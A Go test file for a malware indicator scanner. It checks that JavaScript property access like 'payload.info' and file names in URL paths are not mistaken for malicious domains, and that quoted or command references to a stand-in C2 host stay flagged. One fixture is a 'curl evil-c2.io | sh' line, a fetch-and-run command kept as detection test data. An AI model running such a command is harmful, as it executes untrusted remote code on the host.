package iocscan

import (
	"testing"

	"github.com/vulnetix/malscan-engine/detect"
)

// npm packages were minted as malware because `payload.info` is also a domain (.info is a TLD) and
// `update.zip` in a URL path is also a domain (.zip is a TLD).
func codeTokenSet() *IndicatorSet {
	set := NewIndicatorSet()
	set.AddAll([]*Indicator{
		{Type: TypeDomain, Value: "payload.info"},
		{Type: TypeDomain, Value: "update.zip"},
		{Type: TypeDomain, Value: "evil-c2.io"},
	})
	return set
}

func classesOf(ev []Evidence) []detect.Class {
	var out []detect.Class
	for _, e := range ev {
		c := e.Class
		if c == "" {
			c = detect.ClassEvidence
		}
		out = append(out, c)
	}
	return out
}

func TestMemberAccessIsNotAHost(t *testing.T) {
	m := NewMatcher(codeTokenSet(), 0)
	for _, line := range []string{
		"  const info = payload.info;",
		"    this.info = payload.info;",
		"if (!usage && payload.info == null && isObject(payload.rate_limits))",
		"    const total = validUsage(payload.info.total_token_usage);",
	} {
		for _, c := range classesOf(m.MatchText("src/a.js", line+"\n")) {
			if c == detect.ClassEvidence {
				t.Errorf("member access %q read as a known-bad host", line)
			}
		}
	}
}

func TestQuotedAndCommandHostsStayEvidence(t *testing.T) {
	m := NewMatcher(codeTokenSet(), 0)
	for _, line := range []string{
		`const c2 = "evil-c2.io";`,
		`fetch('evil-c2.io/x')`,
		`curl evil-c2.io | sh`,
		`HOST=evil-c2.io`,
		`const u = "https://evil-c2.io/a"`,
		`const p = "payload.info"`, // quoted: a string, not member access
	} {
		ev := m.MatchText("src/a.js", line+"\n")
		found := false
		for _, c := range classesOf(ev) {
			if c == detect.ClassEvidence {
				found = true
			}
		}
		if !found {
			t.Errorf("%q should stay evidence; got %v", line, classesOf(ev))
		}
	}
}

func TestFileNameInAUrlPathIsNotAHost(t *testing.T) {
	m := NewMatcher(codeTokenSet(), 0)
	if ev := m.MatchText("src/a.js", `el.placeholder = "https://example.com/update.zip";`+"\n"); len(ev) != 0 {
		t.Errorf("update.zip in a URL path matched: %v", classesOf(ev))
	}
}
